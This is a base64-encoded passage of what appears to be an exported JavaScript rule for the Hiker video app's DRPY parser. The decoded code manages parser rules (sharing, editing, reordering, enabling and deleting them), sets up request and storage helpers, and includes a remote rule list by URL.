Y29sX3R5cGU6IFxcXCJpY29uX3NtYWxsXzRcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiaGlrZXI6Ly9pbWFnZXMvaWNvbl9kb21haW5fY29uZmlnXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHBhZ2VUaXRsZTogXFxcIuaWsOWinuino+aekFxcXCJcXG4gICAgfVxcbn0pO1xcblxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5YiG5LqrXFxcIixcXG4gICAgdXJsOiAkKFxcXCItMVxcXCIsIFxcXCLovpPlhaXkvaDopoHliIbkuqvop6PmnpDnmoTluo/lj7dcXFxcbi0x5YWo6YOo77yMLTLlt7LlkK/nlKjnmoTvvIwtM+W3suemgeeUqOeahFxcXCIpLmlucHV0KChsZW5ndGgpID0+IHtcXG4gICAgICAgIGxldCBpbmRleGMgPSBpbnB1dC5zcGxpdCgvLHzvvIwvKTtcXG4gICAgICAgIGxldCBpbmRleHMgPSBbXTtcXG4gICAgICAgIGxldCBtbyA9IHBhcnNlSW50KGluZGV4Y1swXSk7XFxuICAgICAgICBpZiAoIShpbmRleGMubGVuZ3RoICE9PSAwICYmIG1vIDwgMCAmJiBtbyA+IC01KSkge1xcbiAgICAgICAgICAgIGZvciAobGV0IGl0IG9mIGluZGV4Yykge1xcbiAgICAgICAgICAgICAgICBsZXQgbnVtID0gcGFyc2VJbnQoaXQpO1xcbiAgICAgICAgICAgICAgICBpZiAoTnVtYmVyLmlzTmFOKG51bSkgfHwgbnVtID49IGxlbmd0aCB8fCBudW0gPCAwKSB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5pWw5a2X5LiN5ZCI5rOVXFxcIjtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpbmRleHMucHVzaChudW0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiAkKFtcXFwiSElLRVJcXFwiLCBcXFwiVFhUXFxcIl0uY29uY2F0KGdldFBhc3RlcygpKSwgMiwgXFxcIuWIhuS6q+aWueW8j1xcXCIpLnNlbGVjdCgobW8sIGluZGV4cywgZXh0KSA9PiB7XFxuICAgICAgICAgICAgZnVuY3Rpb24gdXAocnVsZXMpIHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGViNjQgPSBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkocnVsZXMpKTtcXG4gICAgICAgICAgICAgICAgbGV0IGdldFBhc3MgPSAobGVuZ3RoLCBydWxlLCB0eXBlKSA9PiBcXFwi5rW36ZiU6KeG55WM77yMRFJQWeino+aekO+8jOWFseOAjFxcXCIgKyBsZW5ndGggKyBcXFwi44CN5p2h77yM5aSN5Yi25pW05p2h5Y+j5Luk5omT5byA6L2v5Lu25bCx5Lya6Ieq5Yqo5a+85YWlJFxcXCIgKyBydWxlICsgXFxcIiRcXFwiICsgdHlwZSArIFxcXCJAaW1wb3J0PWpzOiQucmVxdWlyZSgnaW1wb3J0P3J1bGU9JytcXFwiICsgSlNPTi5zdHJpbmdpZnkoTVlfUlVMRS50aXRsZSkgKyBcXFwiKShpbnB1dClcXFwiO1xcbiAgICAgICAgICAgICAgICBpZiAoZ2V0UGFzdGVzKCkuaW5jbHVkZXMoaW5wdXQpKSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgdSA9IHNoYXJlUGFzdGUocnVsZWI2NCwgaW5wdXQpO1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJjb3B5Oi8vXFxcIiArIGdldFBhc3MocnVsZXMubGVuZ3RoLCB1LCBcXFwiYlxcXCIpO1xcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IHBhdGggPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9Mb3lEZ0lrL3NoYXJlL2RycHnop6PmnpDjgIxcXFwiICsgcnVsZXMubGVuZ3RoICsgXFxcIuOAjeadoS5cXFwiICsgKGlucHV0ID09PSBcXFwiSElLRVJcXFwiID8gXFxcImhpa2VyXFxcIiA6IFxcXCJ0eHRcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlRmlsZShwYXRoLCBnZXRQYXNzKHJ1bGVzLmxlbmd0aCwgcnVsZWI2NCwgXFxcImFcXFwiKSk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInNoYXJlOi8vXFxcIiArIHBhdGg7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgbGV0IHJ1bGVzO1xcbiAgICAgICAgICAgIGlmIChtbyA9PT0gLTEpIHtcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRKc29uKCk7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChtbyA9PT0gLTIpIHtcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRVc2VmdWxKc29uKCk7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChtbyA9PT0gLTMpIHtcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRGb3JiaWRkZW5Kc29uKCk7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRKc29uKCkuZmlsdGVyKCh2LCBpKSA9PiBpbmRleHMuaW5jbHVkZXMoaSkpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBydWxlcyA9IHJ1bGVzLm1hcCgodikgPT4ge1xcbiAgICAgICAgICAgICAgICB2LmZvcmJpZGRlbiA9IHVuZGVmaW5lZDtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHY7XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgcmV0dXJuIHVwKHJ1bGVzKTtcXG4gICAgICAgIH0sIG1vLCBpbmRleHMsIGluZGV4Y1sxXSk7XFxuXFxuICAgIH0sIGxlbmd0aCksXFxuICAgIGNvbF90eXBlOiBcXFwiaWNvbl9zbWFsbF80XFxcIixcXG4gICAgcGljX3VybDogXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fc2hhcmVfZ3JlZW5cXFwiXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLph43nva5cXFwiLFxcbiAgICB1cmw6ICQoXFxcIuS9oOehruWumumHjee9ru+8n1xcXFxu6K+l5pON5L2c5Lya5Yig6Zmk546w5pyJ6Kej5p6Q77yM5oGi5aSN6Ieq5bim6Kej5p6Q44CCXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcbiAgICAgICAgZGVsZXRlRmlsZShwYXRoKTtcXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgIH0sICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLnBhdGgpLFxcbiAgICBjb2xfdHlwZTogXFxcImljb25fc21hbGxfNFxcXCIsXFxuICAgIHBpY191cmw6IFxcXCJoaWtlcjovL2ltYWdlcy9pY29uX3JlZnJlc2hcXFwiXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmuIXnqbpcXFwiLFxcbiAgICB1cmw6ICQoXFxcIuS9oOehruWumuWFqOmDqOWIoOmZpO+8n1xcXFxu6K+l5pON5L2c5Lya5Yig6Zmk546w5pyJ6Kej5p6Q44CCXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcbiAgICAgICAgd3JpdGVGaWxlKHBhdGgsIFxcXCJbXVxcXCIpO1xcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgfSwgJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIikucGF0aCksXFxuICAgIGNvbF90eXBlOiBcXFwiaWNvbl9zbWFsbF80XFxcIixcXG4gICAgcGljX3VybDogXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fY29kZV92aWV3XFxcIlxcbn0pO1xcblxcbmQucHVzaCh7XFxuICAgIC8vdGl0bGU6ICc8Zm9udCBjb2xvcj1cXFwiIzEzQjYxQlxcXCI+4paQIDwvZm9udD48Yj7op6PmnpDliJfooag8Yj4gKCcgKyBTdHJpbmcobGVuZ3RoKS5mb250Y29sb3IoXFxcIiNmZjY2MDFcXFwiKSArIFxcXCIpXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiLFxcbn0pO1xcbmxldCBjb3VudFRpdGxlID0gZC5hdCgtMSk7XFxuXFxuXFxubGV0IGNvdW50ID0gZC5sZW5ndGg7XFxuXFxuZm9yIChsZXQgaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykge1xcbiAgICBsZXQgaXQgPSBhcnJbaV07XFxuXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnVsnICsgaSArICddPGI+ICAnICsgaXQubmFtZSArIChpdC5mb3JiaWRkZW4gPyBcXFwiICPigJzigJznpoHnlKjigJ3igJ1cXFwiLnNtYWxsKCkgOiBcXFwiXFxcIiksXFxuICAgICAgICBkZXNjOiBpdC51cmwsXFxuICAgICAgICB1cmw6ICQoW1xcXCLnvJbovpFcXFwiLCBcXFwi5YiG5LqrXFxcIiwgXFxcIuemgeeUqC/lkK/nlKhcXFwiLCBcXFwi56e75YqoXFxcIiwgXFxcIue9rumhtlxcXCIsIFxcXCLliKDpmaRcXFwiXSwgMSwgXFxcIuaTjeS9nO+8mlxcXCIgKyBpdC5uYW1lKS5zZWxlY3QoKGluZGV4LCBsZW5ndGgpID0+IHtcXG4gICAgICAgICAgICBpZiAoaW5wdXQgPT09IFxcXCLnvJbovpFcXFwiKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL3J1bGVFZGl0I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjXFxcIjtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGlucHV0ID09PSBcXFwi5YiG5LqrXFxcIikge1xcbiAgICAgICAgICAgICAgICBsZXQgb3BzID0gZ2V0UGFzdGVzKCk7XFxuICAgICAgICAgICAgICAgIG9wcy51bnNoaWZ0KFxcXCLlrozmlbTlj6Pku6RcXFwiKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuICQob3BzLCAyLCBcXFwi5YiG5Lqr5pa55byPXFxcIikuc2VsZWN0KChpbmRleCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5nZXRKc29uKClbaW5kZXhdO1xcbiAgICAgICAgICAgICAgICAgICAgcnVsZS51c2VyID0gdW5kZWZpbmVkO1xcbiAgICAgICAgICAgICAgICAgICAgcnVsZS5mb3JiaWRkZW4gPSB1bmRlZmluZWQ7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgcnVsZWI2NCA9IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShydWxlKSk7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgZ2V0UGFzcyA9IChuYW1lLCBydWxlLCB0eXBlKSA9PiBcXFwi5rW36ZiU6KeG55WM77yM44CMXFxcIiArIG5hbWUgKyBcXFwi44CNRFJQWeino+aekO+8jOWkjeWItuaVtOadoeWPo+S7pOaJk+W8gOi9r+S7tuWwseS8muiHquWKqOWvvOWFpSRcXFwiICsgcnVsZSArIFxcXCIkXFxcIiArIHR5cGUgKyBcXFwiQGltcG9ydD1qczokLnJlcXVpcmUoJ2ltcG9ydD9ydWxlPScrXFxcIiArIEpTT04uc3RyaW5naWZ5KE1ZX1JVTEUudGl0bGUpICsgXFxcIikoaW5wdXQpXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PSBcXFwi5a6M5pW05Y+j5LukXFxcIikge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiY29weTovL1xcXCIgKyBnZXRQYXNzKHJ1bGUubmFtZSwgcnVsZWI2NCwgXFxcImFcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHUgPSBzaGFyZVBhc3RlKHJ1bGViNjQsIGlucHV0KTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImNvcHk6Ly9cXFwiICsgZ2V0UGFzcyhydWxlLm5hbWUsIHUsIFxcXCJiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0sIGluZGV4KTtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGlucHV0ID09PSBcXFwi56e75YqoXFxcIikge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJChpbmRleCArIFxcXCJcXFwiLCBcXFwi6L6T5YWl5L2N572uXFxcIikuaW5wdXQoKGluZGV4LCBsZW5ndGgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBuZXdJbmRleCA9IE51bWJlcihpbnB1dCk7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoTnVtYmVyLmlzTmFOKG5ld0luZGV4KSB8fCBuZXdJbmRleCA+PSBsZW5ndGgpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5LiN5ZKM6KeE55qE5L2N572uXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlID0gcnVsZXMuc3BsaWNlKGluZGV4LCAxKVswXTtcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzLnNwbGljZShuZXdJbmRleCwgMCwgcnVsZSk7XFxuICAgICAgICAgICAgICAgICAgICAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5zYXZlSnNvbihydWxlcyk7XFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgICAgIH0sIGluZGV4LCBsZW5ndGgpO1xcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09IFxcXCLnva7pobZcXFwiKSB7XFxuICAgICAgICAgICAgICAgIGxldCBuZXdJbmRleCA9IDA7XFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSBydWxlcy5zcGxpY2UoaW5kZXgsIDEpWzBdO1xcbiAgICAgICAgICAgICAgICBydWxlcy5zcGxpY2UobmV3SW5kZXgsIDAsIHJ1bGUpO1xcbiAgICAgICAgICAgICAgICAkLnJlcXVpcmUoXFxcImNvbmZpZ3NcXFwiKS5zYXZlSnNvbihydWxlcyk7XFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGlucHV0ID09PSBcXFwi5Yig6ZmkXFxcIikge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJChcXFwi56Gu6K6k5Yig6Zmk77yfXFxcIikuY29uZmlybSgoaW5kZXgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlID0gcnVsZXMuc3BsaWNlKGluZGV4LCAxKVswXTtcXG4gICAgICAgICAgICAgICAgICAgICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLnNhdmVKc29uKHJ1bGVzKTtcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7LliKDpmaRcXFwiICsgcnVsZS5uYW1lO1xcbiAgICAgICAgICAgICAgICB9LCBpbmRleCk7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgbGV0IGFyciA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSBhcnJbaW5kZXhdO1xcbiAgICAgICAgICAgICAgICBydWxlLmZvcmJpZGRlbiA9ICFydWxlLmZvcmJpZGRlbjtcXG4gICAgICAgICAgICAgICAgJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIikuc2F2ZUpzb24oYXJyKTtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICAvL3JldHVybiBcXFwidG9hc3Q6Ly9cXFwiICsgKHJ1bGUuZm9yYmlkZGVuID8gXFxcIuemgeeUqFxcXCIgOiBcXFwi5ZCv55SoXFxcIikgKyBydWxlLm5hbWU7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSwgaSwgbGVuZ3RoKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgaTogaSxcXG4gICAgICAgICAgICBwYWdlVGl0bGU6IGl0Lm5hbWVcXG4gICAgICAgIH1cXG4gICAgfSk7XFxufVxcbmNvdW50VGl0bGUudGl0bGUgPSAnPGZvbnQgY29sb3I9XFxcIiMxM0I2MUJcXFwiPuKWkCA8L2ZvbnQ+PGI+6Kej5p6Q5YiX6KGoPGI+ICgnICsgKChkLmxlbmd0aCAtIGNvdW50KSArIFxcXCIvXFxcIiArIGxlbmd0aCkuZm9udGNvbG9yKFxcXCIjZmY2NjAxXFxcIikgKyBcXFwiKVxcXCI7XFxuc2V0UmVzdWx0KGQpO1wiLFwiZ3JvdXBcIjpcIua1i+ivlVwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiLyo8JD5cXG5AaW5jbHVkZSBzdGFydFxcbmh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTY5MTYmYXV0aD0xZDM1ZThmMC0yMmU4LTUyNzAtYTlkMS04MjZmNTNmMTc3YWRcXG5AaW5jbHVkZSBlbmRcXG48JD4qL1xcblwiLFwicGFnZXNcIjpcIlt7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCJkcnB5XFxcIixcXFwicGF0aFxcXCI6XFxcImRycHlcXFwiLFxcXCJydWxlXFxcIjpcXFwiZnVuY3Rpb24gaW5pdEhpa2VyKCkge1xcXFxuICAgIGNvbnN0IGlzQ2xvc2VMb2cgPSAhZ2V0SXRlbShcXFxcXFxcInVzZUxvZ1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICBjb25zdCBsb2NhbEtleSA9IFxcXFxcXFwiZHJweVxcXFxcXFwiO1xcXFxuICAgIGNvbnN0IENyeXB0b1V0aWwgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL2Fzc2V0cy9jcnlwdG8tamF2YS5qc1xcXFxcXFwiKTtcXFxcbiAgICBnbG9iYWxUaGlzLmxvY2FsID0ge1xcXFxuICAgICAgICBzZXQocnVsZWtleSwgaywgdikge1xcXFxuICAgICAgICAgICAgc3RvcmFnZTAuc2V0SXRlbShsb2NhbEtleSArIFxcXFxcXFwiQFxcXFxcXFwiICsgcnVsZWtleSArIFxcXFxcXFwiQFxcXFxcXFwiICsgaywgdik7XFxcXG4gICAgICAgIH0sXFxcXG4gICAgICAgIGdldChydWxla2V5LCBrLCB2KSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gc3RvcmFnZTAuZ2V0SXRlbShsb2NhbEtleSArIFxcXFxcXFwiQFxcXFxcXFwiICsgcnVsZWtleSArIFxcXFxcXFwiQFxcXFxcXFwiICsgaywgXFxcXFxcXCJcXFxcXFxcIikgfHwgdjtcXFxcbiAgICAgICAgfSxcXFxcbiAgICAgICAgZGVsZXRlKHJ1bGVrZXksIGspIHtcXFxcbiAgICAgICAgICAgIHN0b3JhZ2UwLmNsZWFySXRlbShsb2NhbEtleSArIFxcXFxcXFwiQFxcXFxcXFwiICsgcnVsZWtleSArIFxcXFxcXFwiQFxcXFxcXFwiICsgayk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9O1xcXFxuICAgIGV2YWwoZ2V0Q3J5cHRvSlMoKSk7XFxcXG4gICAgZ2xvYmFsVGhpcy5DcnlwdG9KUyA9IENyeXB0b0pTO1xcXFxuXFxcXG4gICAgbGV0ICRyZXF1ZXN0ID0gcmVxdWVzdDtcXFxcbiAgICBsZXQgJHBvc3QgPSBwb3N0O1xcXFxuICAgIGdsb2JhbFRoaXMucmVxID0gZnVuY3Rpb24gKHVybCwgY29iaikge1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgbGV0IHJlcyA9IHt9O1xcXFxuICAgICAgICAgICAgbGV0IG9iaiA9IE9iamVjdC5hc3NpZ24oe30sIGNvYmopO1xcXFxuICAgICAgICAgICAgaWYgKG9iai5kYXRhKSB7XFxcXG4gICAgICAgICAgICAgICAgb2JqLmJvZHkgPSBvYmouZGF0YTtcXFxcbiAgICAgICAgICAgICAgICBkZWxldGUgb2JqLmRhdGE7XFxcXG4gICAgICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgICAgIGlmIChvYmouaGFzT3duUHJvcGVydHkoXFxcXFxcXCJyZWRpcmVjdFxcXFxcXFwiKSkgb2JqLnJlZGlyZWN0ID0gISFvYmoucmVkaXJlY3Q7XFxcXG4gICAgICAgICAgICBpZiAob2JqLmJ1ZmZlciA9PT0gMikge1xcXFxuICAgICAgICAgICAgICAgIG9iai50b0hleCA9IHRydWU7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBvYmouaGVhZGVycyA9IE9iamVjdC5hc3NpZ24oe1xcXFxuICAgICAgICAgICAgICAgIENvb2tpZTogXFxcXFxcXCIjbm9Db29raWUjXFxcXFxcXCJcXFxcbiAgICAgICAgICAgIH0sIG9iai5oZWFkZXJzKTtcXFxcbiAgICAgICAgICAgIGlmICh1cmwgPT09IFxcXFxcXFwiaHR0cHM6Ly9hcGkubm4uY2kvb2NyL2I2NC90ZXh0XFxcXFxcXCIgJiYgb2JqLmhlYWRlcnMpIHtcXFxcbiAgICAgICAgICAgICAgICBvYmouaGVhZGVyc1tcXFxcXFxcIkNvbnRlbnQtVHlwZVxcXFxcXFwiXSA9IFxcXFxcXFwidGV4dC9wbGFpblxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgICAgICBpZiAodXJsLnN0YXJ0c1dpdGgoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIpICYmICh1cmwuaW5jbHVkZXMoXFxcXFxcXCI/dHlwZT1cXFxcXFxcIikgfHwgdXJsLmluY2x1ZGVzKFxcXFxcXFwiP3BhcmFtcz1cXFxcXFxcIikpKSB7XFxcXG4gICAgICAgICAgICAgICAgdXJsID0gdXJsLnNsaWNlKDAsIHVybC5sYXN0SW5kZXhPZihcXFxcXFxcIj9cXFxcXFxcIikpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgZm9yIChsZXQga2V5IGluIG9iai5oZWFkZXJzKSB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBvYmouaGVhZGVyc1trZXldICE9PSBcXFxcXFxcInN0cmluZ1xcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIG9iai5oZWFkZXJzW2tleV0gPSBTdHJpbmcob2JqLmhlYWRlcnNba2V5XSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbGV0IHIgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgLyogaWYgKFN0cmluZyhvYmoubWV0aG9kKS50b0xvd2VyQ2FzZSgpID09PSBcXFxcXFxcInBvc3RcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgICByID0gJHBvc3QodXJsLCBvYmopO1xcXFxuICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgIHIgPSAkcmVxdWVzdCh1cmwsIG9iaik7XFxcXG4gICAgICAgICAgICAgfSovXFxcXG4gICAgICAgICAgICByID0gJHJlcXVlc3QodXJsLCBvYmopO1xcXFxuICAgICAgICAgICAgaWYgKG9iai53aXRoSGVhZGVycykge1xcXFxuICAgICAgICAgICAgICAgIHIgPSBKU09OLnBhcnNlKHIpO1xcXFxuICAgICAgICAgICAgICAgIHJlcy5jb250ZW50ID0gci5ib2R5O1xcXFxuICAgICAgICAgICAgICAgIHJlcy5oZWFkZXJzID0ge307XFxcXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgW2ssIHZdIG9mIE9iamVjdC5lbnRyaWVzKHIuaGVhZGVycyB8fCB7fSkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVzLmhlYWRlcnNba10gPSB2WzBdO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgcmVzLmNvbnRlbnQgPSByO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgaWYgKG9iai5idWZmZXIgPT09IDIpIHtcXFxcbiAgICAgICAgICAgICAgICByZXMuY29udGVudCA9IENyeXB0b1V0aWwuRGF0YS5wYXJzZUhleChyZXMuY29udGVudCkudG9CYXNlNjQoX2Jhc2U2NC5OT19XUkFQKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiByZXM7XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGxvZyhcXFxcXFxcIkVycm9yXFxcXFxcXCIgKyBlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuICAgIC8qXFxcXG4gICAgY29uc3QgSmluSmEgPSAkLnJlcXVpcmUoXFxcXFxcXCJodHRwczovL2Nkbi5ib290Y2RuLm5ldC9hamF4L2xpYnMvbXVzdGFjaGUuanMvNC4xLjAvbXVzdGFjaGUuanNcXFxcXFxcIik7XFxcXG4gIFxcXFxuICAgIGNvbnN0IEpQID0gJC5yZXF1aXJlKFxcXFxcXFwiaHR0cHM6Ly9qc29ucGF0aC1wbHVzLmdpdGh1Yi5pby9KU09OUGF0aC9kaXN0L2luZGV4LWJyb3dzZXItdW1kLmNqc1xcXFxcXFwiKTtcXFxcbiAgICBnbG9iYWxUaGlzLmNoZWVyaW8gPSB7XFxcXG4gICAgICAgIGppbmphMih0ZW1wbGF0ZSwgb2JqKSB7XFxcXG4gICAgICAgICAgICBcXFxcbiAgICAgICAgICAgIHJldHVybiAkLmxvZyhKaW5KYS5yZW5kZXIodGVtcGxhdGUsIG9iaikpO1xcXFxuICAgICAgICB9LFxcXFxuICAgICAgICBqcChwYXRoLCBqc29uKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gSlAuSlNPTlBhdGgoe1xcXFxuICAgICAgICAgICAgICAgIHBhdGgsXFxcXG4gICAgICAgICAgICAgICAganNvblxcXFxuICAgICAgICAgICAgfSlbMF07XFxcXG4gICAgICAgIH1cXFxcbiAgICB9Ki9cXFxcbiAgICBnbG9iYWxUaGlzLnBkZmEgPSBfcGRmYTtcXFxcbiAgICBnbG9iYWxUaGlzLnBkID0gX3BkO1xcXFxuICAgIGdsb2JhbFRoaXMucGRmaCA9IF9wZGZoO1xcXFxuICAgIFN0cmluZy5wcm90b3R5cGUucmVwbGFjZUFsbCA9IGZ1bmN0aW9uIChzZWFyY2gsIHJlcGxhY2VtZW50KSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLnNwbGl0KHNlYXJjaCkuam9pbihyZXBsYWNlbWVudCk7XFxcXG4gICAgfTtcXFxcbiAgICBsZXQgJHRvU3RyaW5nID0gRnVuY3Rpb24ucHJvdG90eXBlLnRvU3RyaW5nO1xcXFxuICAgIEZ1bmN0aW9uLnByb3RvdHlwZS50b1N0cmluZyA9IGZ1bmN0aW9uICgpIHtcXFxcbiAgICAgICAgcmV0dXJuICR0b1N0cmluZy5hcHBseSh0aGlzKS50cmltKCk7XFxcXG4gICAgfTtcXFxcbiAgICBpZiAoaXNDbG9zZUxvZykge1xcXFxuICAgICAgICAvLyDph43lhpljb25zb2xlLmxvZ+WHveaVsFxcXFxuICAgICAgICBjb25zb2xlLmxvZyA9IGZ1bmN0aW9uICgpIHtcXFxcbiAgICAgICAgICAgIC8vIOajgOafpeS8oOWFpeWPguaVsOeahOaVsOmHj1xcXFxuICAgICAgICAgICAgaWYgKGFyZ3VtZW50cy5